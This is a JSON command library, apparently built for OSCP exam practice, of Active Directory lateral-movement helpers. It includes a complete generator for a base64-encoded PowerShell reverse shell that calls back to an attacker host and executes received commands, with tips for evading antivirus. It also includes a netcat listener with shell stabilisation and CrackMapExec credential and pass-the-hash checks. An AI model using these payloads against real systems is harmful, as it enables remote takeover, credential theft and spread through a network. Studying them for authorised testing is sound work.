{"commands": [{"id": "wmi-creds-pscredential", "name": "Helper - Create PSCredential Object for WMI/WinRM", "description": "Create PowerShell credential object for use in WMI, WinRM, and other remoting commands", "command": "$password = ConvertTo-SecureString '<PASS>' -AsPlainText -Force; $credential = New-Object System.Management.Automation.PSCredential('<USER>', $password)", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<USER>", "description": "Domain\\username or username", "example": "corp\\jen", "required": true}, {"name": "<PASS>", "description": "Password", "example": "Nexus123!", "required": true}], "tags": ["oscp", "helper", "pscredential", "powershell", "active-directory", "windows", "utility", "oscp:high"], "prerequisites": [], "alternatives": [], "next_steps": ["Use $credential variable in -Credential parameter", "Examples: New-PSSession, Invoke-Command, Invoke-WmiMethod, New-CimSession"], "flag_explanations": {"ConvertTo-SecureString": "Convert plaintext password to SecureString object (encrypted in memory)", "-AsPlainText": "Allow plaintext input (normally requires interactive prompt)", "-Force": "Bypass security warning for plaintext password", "New-Object System.Management.Automation.PSCredential": "Create credential object with username and SecureString password", "Get-Credential": "Interactive alternative - prompts user for username/password (better OPSEC)"}, "success_indicators": ["$credential variable contains PSCredential object", "$credential | Get-Member shows PSCredential type", "UserName and Password properties present", "$credential.UserName shows username"], "failure_indicators": ["ConvertTo-SecureString error", "Cannot convert argument", "New-Object failed"], "troubleshooting": {"Special characters in password": "Use single quotes around password to prevent PowerShell interpretation: '<PASS>'", "Password visible in history": "Use $password = Read-Host -AsSecureString for sensitive scenarios (no plaintext)", "Domain format error": "Use 'corp\\jen' not 'jen@corp.com' for username format", "Cannot convert to SecureString": "Verify password string is valid. Test with: '<PASS>'.GetType()"}, "notes": "EDUCATIONAL CONTEXT: PSCredential is PowerShell object encapsulating username and encrypted password for remote authentication. WHY NEEDED: Many PowerShell remoting cmdlets require PSCredential object, not plain strings. SECURITY: SecureString encrypts password in memory using DPAPI (Data Protection API) - not plaintext. REUSABILITY: Create $credential once at session start, reuse in multiple commands (Invoke-Command, New-PSSession, Invoke-WmiMethod, etc.). ALTERNATIVE: Get-Credential provides interactive prompt (better OPSEC - no password in command history or logs). VERIFICATION: Test credential with $credential.GetNetworkCredential().Password to view plaintext (debugging only). BEHIND THE SCENES: PSCredential stores username as string, password as SecureString (encrypted). TIME ESTIMATE: <30 seconds to create. EXAM TIP: Create credential object at start of session, reuse throughout lateral movement commands. Saves typing and reduces errors.", "oscp_relevance": "high"}, {"id": "revshell-ps-generator", "name": "Helper - Generate Base64 PowerShell Reverse Shell", "description": "Python one-liner to generate base64-encoded PowerShell reverse shell with custom LHOST/LPORT for lateral movement", "command": "python3 -c \"import base64; LHOST='<LHOST>'; LPORT='<LPORT>'; payload = f'\\$client = New-Object System.Net.Sockets.TCPClient(\\'{LHOST}\\',{LPORT});\\$stream = \\$client.GetStream();[byte[]]\\$bytes = 0..65535|%{{0}};while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){{;\\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes,0, \\$i);\\$sendback = (iex \\$data 2>&1 | Out-String );\\$sendback2 = \\$sendback + \\\"PS \\\" + (pwd).Path + \\\"> \\\";\\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2);\\$stream.Write(\\$sendbyte,0,\\$sendbyte.Length);\\$stream.Flush()}};\\$client.Close()'; encoded = base64.b64encode(payload.encode('utf16')[2:]).decode(); print(encoded)\"", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<LHOST>", "description": "Attacker IP for reverse connection", "example": "192.168.45.200", "required": true}, {"name": "<LPORT>", "description": "Attacker port for listener", "example": "443", "required": true}], "tags": ["oscp", "helper", "reverse-shell", "powershell", "generator", "kali", "utility", "base64", "oscp:high"], "prerequisites": ["Python3 on Kali (pre-installed)", "Netcat listener ready: nc -lvnp <LPORT>"], "alternatives": ["Manual base64-encode-powershell with custom payload", "Metasploit web_delivery module"], "next_steps": ["Copy base64 output to <BASE64_PAYLOAD> variable", "Use in wmi-powershell-revshell, dcom-mmc20-revshell, or winrm-revshell-invoke", "Start listener before execution: nc -lvnp <LPORT>"], "flag_explanations": {"TCPClient('<LHOST>',<LPORT>)": "Creates TCP connection to attacker IP and port", "GetStream()": "Get network stream for bidirectional read/write", "while loop": "Continuously read commands from attacker, execute, send output back", "iex $data": "Execute received commands (Invoke-Expression alias)", "Out-String": "Convert command output objects to string for transmission", "pwd": "Current directory path for PowerShell prompt simulation", "encode('utf16')[2:]": "PowerShell expects UTF-16LE encoding, [2:] removes BOM (Byte Order Mark)", "base64.b64encode()": "Encode payload to base64 for -EncodedCommand parameter"}, "success_indicators": ["Output: long base64 string (no 'powershell -nop -w hidden -e' prefix)", "Listener catches connection when executed with: powershell -nop -w hidden -e <OUTPUT>", "Interactive PowerShell prompt on Kali", "whoami and hostname work in caught shell"], "failure_indicators": ["Python syntax error", "Empty output", "Encoding error", "UnicodeDecodeError"], "troubleshooting": {"Python syntax error": "Ensure LHOST/LPORT properly substituted in command", "No callback when executed": "Verify LHOST reachable from target. Test with: Test-NetConnection <LHOST> -Port <LPORT>", "Connection drops immediately": "Firewall blocking outbound. Check target egress filtering", "Antivirus blocks payload": "Obfuscate payload with Invoke-Obfuscation or use alternative technique", "Base64 decode error": "Verify UTF-16LE encoding: [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('<BASE64>'))"}, "notes": "EDUCATIONAL CONTEXT: One-liner Python script to generate ready-to-use base64-encoded PowerShell reverse shell. WHY USE THIS: Fast payload generation during exploitation, customizable LHOST/LPORT for different scenarios. HOW IT WORKS: 1) TCPClient connects to LHOST:LPORT, 2) Loop reads commands from attacker, 3) Execute with iex (Invoke-Expression), 4) Send output back over TCP, 5) Repeat until connection closed. PAYLOAD STRUCTURE: TCP connection → GetStream → Read commands → Execute → Send output → Loop. BASE64 ENCODING: Avoids command-line escaping issues, bypasses basic signature detection (not AV-proof). UTF-16LE REQUIREMENT: PowerShell -EncodedCommand expects UTF-16 Little Endian encoding with BOM removed. OBFUSCATION: Base64 provides basic evasion but not sophisticated AV bypass. USAGE: Copy output, use in lateral movement command like: powershell -nop -w hidden -e <BASE64>. TIME ESTIMATE: <1 minute for generation + execution. EXAM TIP: Save as script file (generate_revshell.py) for quick access. Pre-generate payloads for common LHOST values (tun0 IP) before exam start.", "oscp_relevance": "high"}, {"id": "nc-listener-tcp", "name": "Helper - Netcat TCP Listener for Reverse Shells", "description": "Start Netcat listener on Kali to catch incoming reverse shell connections from lateral movement payloads", "command": "nc -lvnp <LPORT>", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<LPORT>", "description": "Local port to listen on", "example": "443", "required": true}], "tags": ["oscp", "helper", "netcat", "listener", "reverse-shell", "kali", "utility", "oscp:high"], "prerequisites": ["Netcat installed on Kali (pre-installed)", "Port not in use (check with: sudo lsof -i:<LPORT>)"], "alternatives": ["rlwrap nc -lvnp <LPORT> for readline support (arrow keys, history)", "pwncat-cs -lp <LPORT> for advanced features (file upload, persistence)", "msfconsole exploit/multi/handler for Meterpreter shells"], "next_steps": ["Wait for connection from lateral movement payload", "When connected, execute: whoami; hostname to verify target", "Stabilize shell if needed: python -c 'import pty;pty.spawn(\"/bin/bash\")'", "Upgrade to interactive: Ctrl+Z, stty raw -echo; fg, export TERM=xterm"], "flag_explanations": {"-l": "Listen mode - wait for incoming connections", "-v": "Verbose - show connection details (IP, port)", "-n": "Numeric only - don't resolve DNS names (faster)", "-p <LPORT>": "Port to listen on", "rlwrap": "Readline wrapper - provides arrow keys, command history in shell", "-e /bin/bash": "Execute /bin/bash on connect (dangerous - don't use in listener mode)"}, "success_indicators": ["Listening on 0.0.0.0 <LPORT>", "Connection received from <TARGET_IP>", "Interactive shell prompt appears", "Commands execute successfully"], "failure_indicators": ["Address already in use", "Permission denied", "Connection timeout (no callback)", "Connection received then immediate disconnect"], "troubleshooting": {"Address already in use": "Port conflict. Check what's using port: sudo lsof -i:<LPORT>. Kill process or use different port", "Permission denied": "Ports <1024 require root. Use sudo or choose port >1024 (e.g., 4444, 443 without sudo won't work)", "No connection received": "Verify payload has correct LHOST/LPORT. Check target firewall allows outbound to <LPORT>", "Connection drops immediately": "Payload error or AV killed process. Check payload syntax. Test locally first", "No arrow keys work": "Use rlwrap: rlwrap nc -lvnp <LPORT> for readline support"}, "notes": "EDUCATIONAL CONTEXT: Netcat listener is essential component of reverse shell workflow - attacker-side receiver for callbacks. WHY REVERSE SHELL: Target connects back to attacker (bypasses inbound firewall rules). COMMON PORTS: 443 (HTTPS - often allowed outbound), 4444 (default Metasploit), 80 (HTTP), 53 (DNS). LISTENER TIMING: Start listener BEFORE executing reverse shell payload on target. RLWRAP RECOMMENDATION: Use 'rlwrap nc -lvnp <LPORT>' for better interactivity (arrow keys, command history). STABILIZATION: Raw Netcat shells are unstable - stabilize with: python -c 'import pty;pty.spawn(\"/bin/bash\")' then Ctrl+Z, stty raw -echo; fg. ALTERNATIVE: pwncat-cs provides built-in stabilization, file upload/download, persistence modules. BEHIND THE SCENES: Netcat binds to port, accepts TCP connection, bidirectional data transfer (stdin/stdout). TIME ESTIMATE: <10 seconds to start listener. EXAM TIP: Always start listener before executing payload. Use rlwrap for better UX. Keep listener in tmux/screen pane for persistence.", "oscp_relevance": "high"}, {"id": "verify-root-access-ad", "name": "Helper - Verify Remote Access and Privileges", "description": "Quick verification commands to confirm remote shell access, identify target system, and check privilege level", "command": "whoami; hostname; whoami /priv", "category": "active-directory", "subcategory": "lateral-movement", "variables": [], "tags": ["oscp", "helper", "verification", "enumeration", "windows", "privilege-check", "oscp:high"], "prerequisites": [], "alternatives": ["Get-ComputerInfo for detailed system information", "net user <USERNAME> /domain for domain user info"], "next_steps": ["If SYSTEM: Full control - dump credentials, access all files", "If admin user: Check UAC status: reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", "If standard user: Enumerate for privilege escalation: whoami /all, systeminfo"], "flag_explanations": {"whoami": "Display current user context (domain\\username or NT AUTHORITY\\SYSTEM)", "hostname": "Display computer name (confirms correct target)", "whoami /priv": "Display current privileges (SeImpersonatePrivilege, SeDebugPrivilege, etc.)", "whoami /all": "Display user, groups, SID, and all privileges (comprehensive)", "whoami /groups": "Display group memberships (Administrators, Remote Management Users, etc.)"}, "success_indicators": ["whoami: NT AUTHORITY\\SYSTEM (highest privilege)", "whoami: DOMAIN\\username (expected user context)", "hostname: correct target name", "Privileges include SeImpersonatePrivilege, SeDebugPrivilege (potential PrivEsc paths)"], "failure_indicators": ["Access denied", "Command not found", "Shell hangs or crashes"], "troubleshooting": {"whoami not found": "Unlikely on Windows. Verify shell is Windows not Linux", "Access denied on whoami /priv": "Very unlikely. Verify shell is responsive: echo test", "Wrong user context": "Payload executed as different user. Check credential used in lateral movement", "Wrong hostname": "Connected to wrong target. Verify IP in payload matches intended target"}, "notes": "EDUCATIONAL CONTEXT: First commands to run after obtaining remote shell - verify access and assess privilege level. WHY THESE COMMANDS: whoami confirms user context, hostname confirms target, whoami /priv shows available privileges for escalation. SYSTEM vs ADMIN: NT AUTHORITY\\SYSTEM is highest privilege (kernel-level), local admin is high but not SYSTEM. PRIVILEGE ESCALATION: If SeImpersonatePrivilege present, can use Juicy Potato/PrintSpoofer/RoguePotato for SYSTEM. COMMON CONTEXTS: PSExec→SYSTEM, WMI→user, WinRM→user, DCOM→user. GROUP MEMBERSHIP: whoami /groups shows if user in Administrators local group. SID IDENTIFICATION: whoami /all shows SID - useful for token manipulation. TIME ESTIMATE: <10 seconds to run all three commands. EXAM TIP: Always verify access immediately after shell obtained - confirms success and informs next steps (credential dump if SYSTEM, PrivEsc if user).", "oscp_relevance": "high"}, {"id": "lateral-movement-port-check", "name": "Helper - Quick Port Check for Lateral Movement Options", "description": "Rapidly scan common lateral movement ports on target to determine available attack vectors", "command": "sudo nmap -p 135,445,5985,5986,3389 -Pn -sV -v <TARGET>", "category": "active-directory", "subcategory": "lateral-movement", "variables": [{"name": "<TARGET>", "description": "Target IP address or hostname", "example": "192.168.50.73", "required": true}], "tags": ["oscp", "helper", "enumeration", "port-scan", "nmap", "active-directory", "kali", "oscp:high"], "prerequisites": ["nmap installed on Kali (pre-installed)"], "alternatives": ["crackmapexec smb <TARGET> for comprehensive SMB/WinRM/LDAP check", "Test-NetConnection <TARGET> -Port <PORT> from PowerShell for single port test"], "next_steps": ["135 open → WMI (wmi-new-cimsession) or DCOM (dcom-mmc20-revshell) possible", "445 open → PSExec (psexec-impacket-shell) or SMBExec (smbexec-impacket-fileless) possible", "5985 open → WinRM HTTP (evil-winrm-creds, winrm-enter-pssession) possible", "5986 open → WinRM HTTPS (evil-winrm-creds -S) possible", "3389 open → RDP (rdesktop, xfreerdp) for manual GUI access"], "flag_explanations": {"-p 135,445,5985,5986,3389": "Scan specific lateral movement ports (RPC, SMB, WinRM HTTP/HTTPS, RDP)", "-Pn": "Skip ping check - treat host as up (bypass ICMP filtering)", "-sV": "Service version detection - identify exact service/version", "-v": "Verbose output - show progress during scan", "sudo": "Required for SYN scan and accurate OS/service detection"}, "success_indicators": ["135/tcp open  msrpc (Microsoft RPC)", "445/tcp open  microsoft-ds (SMB)", "5985/tcp open  http (Microsoft HTTPAPI httpd 2.0 - WinRM)", "5986/tcp open  ssl/http (WinRM over HTTPS)", "3389/tcp open  ms-wbt-server (RDP)"], "failure_indicators": ["All ports filtered/closed", "Host seems down", "No response on any port"], "troubleshooting": {"All ports filtered": "Firewall blocking - may need pivoting or alternative access path", "Host seems down": "Verify IP correct: ping <TARGET>. If pingable but ports filtered, use -Pn (already included)", "Slow scan": "Add -T4 for faster timing (aggressive): sudo nmap -p 135,445,5985,5986,3389 -Pn -sV -v -T4 <TARGET>", "Connection timeout": "Network unreachable. Check routing: ip route get <TARGET>"}, "notes": "EDUCATIONAL CONTEXT: Quick reconnaissance to determine viable lateral movement vectors before attempting exploitation. PORT MEANINGS: 135=RPC (WMI/DCOM), 445=SMB (PSExec/SMBExec), 5985=WinRM HTTP, 5986=WinRM HTTPS, 3389=RDP. TECHNIQUE MAPPING: Use port availability to select lateral movement technique (see decision tree). FAST SCAN: Only 5 ports - completes in <1 minute vs full 65535 port scan. TECHNIQUE PRIORITY: If multiple ports open, try WinRM first (cleanest), then PSExec (most reliable), then WMI/DCOM (stealthier). COMPARISON: More targeted than full nmap scan, faster than testing each technique individually. SERVICE DETECTION: -sV identifies exact service version (e.g., WinRM vs generic HTTP on 5985). BEHIND THE SCENES: Nmap sends SYN packets to ports, analyzes responses, fingerprints services with version probes. TIME ESTIMATE: 30 seconds to 1 minute for port scan. EXAM TIP: Run this immediately after identifying target to plan lateral movement approach. Saves time by focusing on available techniques only.", "oscp_relevance": "high"}, {"id": "lateral-movement-troubleshooting", "name": "Helper - Troubleshoot Common Lateral Movement Failures", "description": "Systematic troubleshooting guide for diagnosing authentication failures, connection timeouts, and access denied errors", "command": "# Test credentials: crackmapexec smb <TARGET> -u <USER> -p <PASS>\n# Test admin access: crackmapexec smb <TARGET> -u <USER> -p <PASS> --shares\n# Test hash: crackmapexec smb <TARGET> -u <USER> -H <NTLM>\n# Check UAC restriction: If local admin hash fails but domain user works, UAC blocking PTH\n# Verify ports: sudo nmap -p 135,445,5985 -Pn -v <TARGET>\n# Check firewall: Test-NetConnection <TARGET> -Port <PORT> from Windows\n# Time sync: net time \\\\<DC> (Kerberos requires <5 min time skew)\n# Service status: Get-Service WinRM,RpcSs -ComputerName <TARGET>", "category": "active-directory", "subcategory": "lateral-movement", "variables": [], "tags": ["oscp", "helper", "troubleshooting", "authentication", "active-directory", "reference", "oscp:high"], "prerequisites": ["Target identified", "CrackMapExec installed on Kali"], "alternatives": [], "next_steps": ["Follow troubleshooting steps in order until root cause identified", "Apply appropriate fix based on failure type", "Retry lateral movement with corrected parameters"], "flag_explanations": {"crackmapexec smb": "Test SMB authentication and admin access", "--shares": "Verify ADMIN$ share accessible (confirms admin rights)", "-H <NTLM>": "Test pass-the-hash with NTLM hash", "sudo nmap -p 135,445,5985": "Verify required ports open for lateral movement", "Test-NetConnection -Port": "PowerShell connectivity test to specific port", "net time \\\\<DC>": "Check time difference with Domain Controller (Kerberos requirement)", "Get-Service WinRM,RpcSs": "Verify required services running on target"}, "success_indicators": ["[+] Pwn3d! from CrackMapExec (admin access confirmed)", "ADMIN$ share visible with READ,WRITE permissions", "Ports 135, 445, or 5985 open on target", "Time skew <5 minutes from DC", "Required services running"], "failure_indicators": ["STATUS_LOGON_FAILURE", "STATUS_ACCESS_DENIED", "Connection timeout", "RPC server unavailable", "The user name or password is incorrect"], "troubleshooting": {"STATUS_LOGON_FAILURE": "Invalid credentials. Verify username/password correct. Test with: crackmapexec smb <TARGET> -u <USER> -p <PASS>", "STATUS_ACCESS_DENIED": "User authenticated but not local admin. Verify admin group membership: net user <USER> /domain", "No Pwn3d! but authentication succeeds": "User not in Administrators local group. PSExec/WMI will fail. Try different user or PrivEsc", "UAC restriction (local admin hash fails)": "2014 Microsoft patch blocks non-RID-500 local admin PTH. Use domain user or find RID 500 Administrator hash", "Connection timeout": "Firewall blocking ports. Verify with: sudo nmap -p 135,445,5985 -Pn -v <TARGET>", "RPC server unavailable": "Port 135 filtered or RPC service disabled. Use alternative: WinRM (5985) or SMB (445) only techniques", "Kerberos time skew": "Clock difference >5 minutes. Sync time: sudo ntpdate <DC_IP> or net time \\\\<DC> /set /yes", "Service not running": "WinRM or RPC service disabled. Enable remotely if admin: Set-Service WinRM -StartupType Automatic -Status Running"}, "notes": "EDUCATIONAL CONTEXT: Systematic troubleshooting framework for lateral movement failures - saves exam time. COMMON CAUSES: 1) Invalid credentials (most common), 2) User not admin (second most common), 3) UAC remote restrictions (hash-based auth), 4) Firewall blocking ports, 5) Time skew (Kerberos), 6) Service disabled. TROUBLESHOOTING ORDER: Test credentials → Verify admin access → Check ports → Verify services → Check time sync. UAC LIMITATION: 2014 KB2871997 patch blocks local admin pass-the-hash for non-RID-500 accounts (domain users unaffected). CRACKMAPEXEC VERIFICATION: Always test with CME before full exploitation - fastest way to verify credentials and admin access. PWNED MEANING: [+] Pwn3d! indicator confirms user has local administrator rights (can PSExec/WMI). TIME SKEW: Kerberos authentication fails if clock difference >5 minutes from DC - sync with ntpdate or net time. FIREWALL: If ports show 'filtered' in nmap, lateral movement impossible without pivoting. SERVICE DEPENDENCIES: WinRM requires WinRM service, WMI requires RpcSs (RPC), PSExec requires Server service. TIME ESTIMATE: 5-10 minutes for full troubleshooting workflow. EXAM TIP: Don't waste time on blocked techniques - verify prerequisites first, pivot to alternatives if blocked.", "oscp_relevance": "high"}]}